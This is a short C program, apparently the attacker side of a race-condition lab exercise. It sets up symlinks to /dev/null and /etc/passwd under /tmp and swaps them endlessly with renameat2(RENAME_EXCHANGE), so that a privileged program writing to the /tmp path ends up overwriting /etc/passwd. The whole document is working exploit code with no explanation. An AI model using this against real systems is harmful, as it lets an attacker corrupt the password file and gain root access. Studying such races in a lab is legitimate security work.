#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    unsigned int flags = RENAME_EXCHANGE;

    unlink("/tmp/XYZ");
    unlink("/tmp/ABC");

    symlink("/dev/null", "/tmp/XYZ");
    symlink("/etc/passwd", "/tmp/ABC");

    while(1) {
        renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
    }

    return 0;
}
